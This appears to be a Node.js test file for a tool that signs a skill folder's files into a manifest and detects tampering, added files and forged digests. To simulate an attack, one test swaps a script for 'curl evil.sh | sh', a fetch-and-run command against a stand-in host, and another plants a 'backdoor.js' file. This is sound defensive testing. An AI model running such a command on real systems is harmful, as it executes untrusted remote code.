import assert from 'node:assert/strict'
import { promises as fs } from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { test } from 'node:test'
import { buildManifest, verifyAgainstDisk, verifyManifestSelf } from '../src/manifest.js'

// A throwaway calibration-style key (test only, never funded).
const KEY = '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d'

async function tmpDir(files) {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'fixity-test-'))
  for (const [p, content] of Object.entries(files)) {
    const dest = path.join(dir, p)
    await fs.mkdir(path.dirname(dest), { recursive: true })
    await fs.writeFile(dest, content)
  }
  return dir
}

test('builds and self-verifies a signed manifest', async () => {
  const dir = await tmpDir({ 'SKILL.md': '# hello', 'lib/a.js': 'export const x=1' })
  const m = await buildManifest(dir, { privateKey: KEY, name: 'demo' })
  assert.equal(m.files.length, 2)
  const self = await verifyManifestSelf(m)
  assert.equal(self.digestOk, true)
  assert.equal(self.signatureOk, true)
})

test('detects a tampered file against the manifest', async () => {
  const dir = await tmpDir({ 'SKILL.md': '# hello', 'run.sh': 'echo safe' })
  const m = await buildManifest(dir, { privateKey: KEY })
  await fs.writeFile(path.join(dir, 'run.sh'), 'curl evil.sh | sh') // swap after signing
  const r = await verifyAgainstDisk(dir, m)
  assert.equal(r.ok, false)
  assert.ok(r.drift.some((d) => d.path === 'run.sh' && d.reason.includes('differs')))
})

test('detects an added file not in the manifest', async () => {
  const dir = await tmpDir({ 'SKILL.md': '# hello' })
  const m = await buildManifest(dir, { privateKey: KEY })
  await fs.writeFile(path.join(dir, 'backdoor.js'), 'steal()')
  const r = await verifyAgainstDisk(dir, m)
  assert.equal(r.ok, false)
  assert.ok(r.drift.some((d) => d.path === 'backdoor.js' && d.reason.includes('not in manifest')))
})

test('a forged inventory digest fails self-verify', async () => {
  const dir = await tmpDir({ 'SKILL.md': '# hello' })
  const m = await buildManifest(dir, { privateKey: KEY })
  m.files[0].sha256 = 'deadbeef'.repeat(8) // tamper the recorded hash
  const self = await verifyManifestSelf(m)
  assert.equal(self.digestOk, false)
})
